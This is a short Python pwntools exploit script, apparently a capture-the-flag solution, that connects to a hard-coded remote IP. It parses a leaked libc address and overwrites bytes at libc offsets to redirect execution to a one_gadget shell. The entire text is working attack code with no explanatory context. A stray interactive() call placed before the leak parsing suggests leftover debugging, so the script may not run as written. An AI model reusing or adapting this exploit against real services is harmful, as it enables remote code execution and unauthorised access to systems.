from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
s.interactive()
s.recvuntil("gift ")
libc = int(s.recvuntil(',')[:-1],16) - 0xcc230
print hex(libc) 
_exit_func = libc + 0x3c5c40
mute_bit1 = (_exit_func&0xff) - 40
mute_bit2 = ((_exit_func>>8)&0xff) - 0x5

s.send(p64(libc+0x3C45F8))
s.send(p8(mute_bit1))
s.send(p64(libc+0x3C45F8 + 1))
s.send(p8(mute_bit2))

target = libc + 0x3c5718
one_gadget = libc + 0x45216
s.send(p64(target))
s.send(p8(one_gadget&0xff))

one_gadget = one_gadget >> 8
s.send(p64(target+1))
s.send(p8(one_gadget&0xff))

one_gadget = one_gadget >> 8
s.send(p64(target+2))
s.send(p8(one_gadget&0xff))
s.interactive()

